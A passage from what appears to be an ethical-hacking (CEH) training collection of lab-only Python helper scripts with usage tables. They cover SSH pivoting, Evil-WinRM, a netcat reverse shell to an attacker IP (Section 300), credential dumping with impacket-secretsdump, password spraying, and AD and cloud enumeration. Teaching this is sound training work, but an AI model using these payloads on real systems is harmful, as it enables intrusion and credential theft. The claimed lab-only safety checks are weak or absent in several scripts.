> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 298 : SSH Pivoting Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: SSH Pivoting Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: SSH Pivoting Helper
# CEH v13 Master Module 07
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates SSH local/remote/dynamic port forwarding commands
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_PIVOT_HOST = "pivot.lab.local"
LAB_PIVOT_USER = "pivot_user"
LAB_LOCAL_PORT = "9050"
LAB_TARGET_INTERNAL = "10.0.0.10:3389"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: SSH Pivoting Helper")
    print("="*80)
    print("# 1. Dynamic port forward (SOCKs proxy):")
    print(f"ssh -D {LAB_LOCAL_PORT} {LAB_PIVOT_USER}@{LAB_PIVOT_HOST}")
    print()
    print("# 2. Local port forward (forward local port to internal target):")
    print(f"ssh -L 3390:{LAB_TARGET_INTERNAL} {LAB_PIVOT_USER}@{LAB_PIVOT_HOST}")
    print()

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 53-ssh-pivoting-helper.py` for packet capture/port scanning, or `./53-ssh-pivoting-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 299 : Evil-WinRM Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Evil-WinRM Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Evil-WinRM Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates Evil-WinRM commands for connecting to Windows via WinRM
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET = "192.168.100.10"
LAB_USER = "Administrator"
LAB_PASS = "labpass123!"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Evil-WinRM Helper")
    print("="*80)
    print("# 1. Connect with password:")
    print(f"evil-winrm -i {LAB_TARGET} -u {LAB_USER} -p '{LAB_PASS}'")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 54-evil-winrm-helper.py` for packet capture/port scanning, or `./54-evil-winrm-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 300 : Netcat Reverse Shell Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Netcat Reverse Shell Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Netcat Reverse Shell Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates netcat listener and reverse shell payload commands
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = "4444"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Netcat Reverse Shell Helper")
    print("="*80)
    print("# 1. Start listener on attacker machine:")
    print(f"nc -lvnp {LAB_ATTACKER_PORT}")
    print()
    print("# 2. Linux reverse shell payload (on target):")
    print(f"nc {LAB_ATTACKER_IP} {LAB_ATTACKER_PORT} -e /bin/bash")
    print()
    print("# 3. Windows netcat reverse shell:")
    print(f"nc.exe {LAB_ATTACKER_IP} {LAB_ATTACKER_PORT} -e cmd.exe")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 55-netcat-reverse-shell-helper.py` for packet capture/port scanning, or `./55-netcat-reverse-shell-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 301 : Hash Identifier Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Hash Identifier Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Hash Identifier Helper
# CEH v13 Master Module 05
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates hash-identifier and hashcat commands for cracking
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_SAMPLE_HASH = "5d41402abc4b2a76b9719d911017c592"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Hash Identifier Helper")
    print("="*80)
    print(f"Hash to identify: {LAB_SAMPLE_HASH}")
    print()
    print("# 1. Use hash-identifier:")
    print(f"hash-identifier {LAB_SAMPLE_HASH}")
    print()
    print("# 2. Once type is known (e.g., MD5, hashcat mode 0):")
    print("hashcat -m 0 hash.txt wordlist.txt")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 56-hash-identifier-helper.py` for packet capture/port scanning, or `./56-hash-identifier-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 302 : FTP Anonymous Login Checker

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: FTP Anonymous Login Checker

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: FTP Anonymous Login Checker
# CEH v13 Master Module 04
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Checks for FTP servers that allow anonymous login
import ftplib
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_IP = "192.168.100.10"
# -----------------------------------------------------------------------------------

def check_ftp_anonymous(ip):
    print("="*80)
    print("LAB-ONLY: FTP Anonymous Login Checker")
    print("="*80)
    try:
        ftp = ftplib.FTP(ip)
        ftp.login("anonymous", "anonymous@example.com")
        print(f"✅ SUCCESS: Anonymous login allowed on {ip}!")
        print("Files found:")
        ftp.retrlines("LIST")
        ftp.quit()
    except Exception as e:
        print(f"❌ FAILURE: {e}")

if __name__ == "__main__":
    if not any(p in LAB_TARGET_IP for p in ["10.", "172.16.", "192.168.", "localhost"]):
        sys.exit("ERROR: LAB-ONLY!")
    check_ftp_anonymous(LAB_TARGET_IP)

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 57-ftp-anonymous-login-check.py` for packet capture/port scanning, or `./57-ftp-anonymous-login-check.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 303 : SNMP Enumeration Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: SNMP Enumeration Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: SNMP Enumeration Helper
# CEH v13 Master Module 04
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates snmpwalk, snmp-check, etc., commands
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_IP = "192.168.100.10"
LAB_COMMUNITY_STRING = "public"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: SNMP Enumeration Helper")
    print("="*80)
    print("# 1. snmpwalk full enumeration:")
    print(f"snmpwalk -c {LAB_COMMUNITY_STRING} -v 2c {LAB_TARGET_IP}")
    print()
    print("# 2. snmp-check:")
    print(f"snmp-check {LAB_TARGET_IP} -c {LAB_COMMUNITY_STRING}")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 58-snmp-enum-helper.py` for packet capture/port scanning, or `./58-snmp-enum-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 304 : WordPress Username Enumeration Tester

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: WordPress Username Enumeration Tester

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: WordPress Username Enumeration Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Enumerates WordPress users via author archive
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_WP = "http://192.168.100.10/wordpress/"
LAB_MAX_USER_ID = 20
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: WordPress Username Enumeration Tester")
    print("="*80)
    for uid in range(1, LAB_MAX_USER_ID +1):
        try:
            url = f"{LAB_TARGET_WP}?author={uid}"
            r = requests.get(url, allow_redirects=True, timeout=5)
            if r.status_code == 200:
                print(f"✅ User ID {uid} found: {r.url}")
        except Exception as e:
            pass

if __name__ == "__main__":
    if not any(p in LAB_TARGET_WP for p in ["10.", "172.16.", "192.168.", "localhost"]):
        sys.exit("ERROR: LAB-ONLY!")
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 59-wordpress-username-enum.py` for packet capture/port scanning, or `./59-wordpress-username-enum.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 305 : CrackMapExec Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: CrackMapExec Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: CrackMapExec Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates CrackMapExec commands for SMB enumeration, spraying, etc.
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET = "192.168.100.0/24"
LAB_USERNAME = "labuser"
LAB_PASSWORD = "labpass123!"
LAB_DOMAIN = "LAB-DOMAIN"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: CrackMapExec (CME) Helper")
    print("="*80)
    print("# 1. Enumerate hosts:")
    print(f"crackmapexec smb {LAB_TARGET}")
    print()
    print("# 2. Enumerate users:")
    print(f"crackmapexec smb {LAB_TARGET} -u {LAB_USERNAME} -p '{LAB_PASSWORD}' --users")
    print()
    print("# 3. Password spray:")
    print(f"crackmapexec smb {LAB_TARGET} -u users.txt -p passwords.txt --continue-on-success")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 60-crackmapexec-helper.py` for packet capture/port scanning, or `./60-crackmapexec-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 306 : AI-Powered Reconnaissance & Analysis

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: AI-Powered Reconnaissance & Analysis

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: AI-Powered Target Recon & Analysis
# CEH v13 Ultimate Offensive Script 01
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import json
import requests
from datetime import datetime

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_OPENAI_API_KEY = "YOUR_LAB_OPENAI_KEY_HERE"  # Use a test key for lab only!
LAB_TARGET = "192.168.100.10"  # YOUR LAB TARGET
LAB_USE_MOCK_AI = True  # Set to True if you don't have an API key (uses mock responses)
# -----------------------------------------------------------------------------------

def mock_ai_analysis(target):
    """Mock AI analysis for lab use when no API key is available"""
    return f"""
=== AI-Powered Recon Analysis for {target} ===
1. Passive OSINT: 3 subdomains found, 2 open TCP ports (22,80)
2. Vulnerability Hypothesis: Possible outdated Apache server (CVE-2021-41773)
3. Exploit Recommendation: Test path traversal payloads on port 80
4. Next Steps: Run directory brute-force, then test SQLi on login page
"""

def ai_analyze_recon(target):
    if LAB_USE_MOCK_AI:
        print("[*] Using mock AI analysis (LAB mode)")
        return mock_ai_analysis(target)
    try:
        headers = {
            "Authorization": f"Bearer {LAB_OPENAI_API_KEY}",
            "Content-Type": "application/json"
        }
        payload = {
            "model": "gpt-3.5-turbo",
            "messages": [
                {"role": "system", "content": "You are a cybersecurity expert assisting with authorized lab recon only."},
                {"role": "user", "content": f"Analyze this lab target: {target}. Provide recon analysis, vulnerability hypotheses, and exploit recommendations."}
            ]
        }
        response = requests.post("https://api.openai.com/v1/chat/completions", headers=headers, json=payload, timeout=30)
        return response.json()["choices"][0]["message"]["content"]
    except Exception as e:
        return f"AI analysis failed: {e}, using mock analysis:\n{mock_ai_analysis(target)}"

def main():
    print("="*80)
    print("LAB-ONLY: AI-Powered Target Recon & Analysis")
    print("="*80)
    print(f"[*] Target: {LAB_TARGET}")
    print("-"*80)
    print("[*] Running AI analysis...")
    analysis = ai_analyze_recon(LAB_TARGET)
    print("\n" + analysis)
    print("="*80)

if __name__ == "__main__":
    # LAB validation
    if not (LAB_TARGET.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")) or LAB_TARGET in ["localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use private lab targets only!")
        sys.exit(1)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 01-ai-powered-recon.py` for packet capture/port scanning, or `./01-ai-powered-recon.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 307 : Cloud Infrastructure Enumeration (AWS/Azure/GCP)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Cloud Infrastructure Enumeration (AWS/Azure/GCP)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Cloud Infrastructure Enumeration (AWS/Azure/GCP)
# CEH v13 Ultimate Offensive Script 02
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import subprocess

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_CLOUD_PROVIDER = "AWS"  # AWS, Azure, or GCP
LAB_TARGET_ACCOUNT_ID = "123456789012"  # YOUR LAB ACCOUNT ID
LAB_REGION = "us-east-1"
# -----------------------------------------------------------------------------------

def enum_aws():
    print("[*] Enumerating AWS lab account...")
    commands = [
        "aws sts get-caller-identity",
        "aws s3 ls",
        "aws ec2 describe-instances --region " + LAB_REGION,
        "aws iam list-users",
        "aws lambda list-functions --region " + LAB_REGION
    ]
    for cmd in commands:
        print(f"\n--- Executing: {cmd} ---")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print("STDERR:", result.stderr)
        except Exception as e:
            print(f"Error: {e}")

def enum_azure():
    print("[*] Enumerating Azure lab account...")
    commands = [
        "az account show",
        "az resource list",
        "az vm list",
        "az storage account list"
    ]
    for cmd in commands:
        print(f"\n--- Executing: {cmd} ---")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}")

def enum_gcp():
    print("[*] Enumerating GCP lab account...")
    commands = [
        "gcloud config list",
        "gcloud compute instances list",
        "gcloud storage ls",
        "gcloud iam service-accounts list"
    ]
    for cmd in commands:
        print(f"\n--- Executing: {cmd} ---")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: Cloud Infrastructure Enumeration")
    print("="*80)
    print(f"[*] Provider: {LAB_CLOUD_PROVIDER}")
    print("-"*80)
    if LAB_CLOUD_PROVIDER == "AWS":
        enum_aws()
    elif LAB_CLOUD_PROVIDER == "Azure":
        enum_azure()
    elif LAB_CLOUD_PROVIDER == "GCP":
        enum_gcp()
    else:
        print("ERROR: Invalid provider! Choose AWS/Azure/GCP!")

if __name__ == "__main__":
    print("WARNING: This script is for LAB USE ONLY with your own cloud accounts!")
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 02-cloud-enum.py` for packet capture/port scanning, or `./02-cloud-enum.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 308 : Full Active Directory Enumeration Suite

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Full Active Directory Enumeration Suite

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Full Active Directory Enumeration (BloodHound + Impacket)
# CEH v13 Ultimate Offensive Script 03
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import subprocess

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "LAB.LOCAL"
LAB_DC_IP = "192.168.100.10"
LAB_USERNAME = "labuser"
LAB_PASSWORD = "labpass123!"
# -----------------------------------------------------------------------------------

def run_bloodhound():
    print("[*] Running BloodHound collection...")
    cmd = f"bloodhound-python -c all -u {LAB_USERNAME}@{LAB_DOMAIN} -p '{LAB_PASSWORD}' -d {LAB_DOMAIN} -dc {LAB_DC_IP}"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Error: {e}")

def run_impacket_enum():
    print("\n[*] Running Impacket enumeration...")
    commands = [
        f"impacket-secretsdump {LAB_DOMAIN}/{LAB_USERNAME}:{LAB_PASSWORD}@{LAB_DC_IP}",
        f"impacket-smbclient {LAB_DOMAIN}/{LAB_USERNAME}:{LAB_PASSWORD}@{LAB_DC_IP}",
        f"impacket-wmiexec {LAB_DOMAIN}/{LAB_USERNAME}:{LAB_PASSWORD}@{LAB_DC_IP} 'whoami'"
    ]
    for cmd in commands:
        print(f"\n--- Executing: {cmd} ---")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: Full AD Enumeration")
    print("="*80)
    print(f"[*] Domain: {LAB_DOMAIN}")
    print("-"*80)
    run_bloodhound()
    run_impacket_enum()

if __name__ == "__main__":
    if not LAB_DC_IP.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")):
        print("ERROR: LAB-ONLY! Use private lab DC IP!")
        sys.exit(1)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 03-full-ad-enum.py` for packet capture/port scanning, or `./03-full-ad-enum.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 309 : Zero-Knowledge Protocol (ZKP) Testing Concepts

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Zero-Knowledge Protocol (ZKP) Testing Concepts

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Zero-Knowledge Protocol Testing (ZK-SNARKs Concept)
# CEH v13 Ultimate Offensive Script 04
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# EDUCATIONAL: Demonstrates ZKP concepts, NOT a real ZK implementation
import hashlib
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_SECRET_VALUE = 42
LAB_PUBLIC_CHALLENGE = 100
# -----------------------------------------------------------------------------------

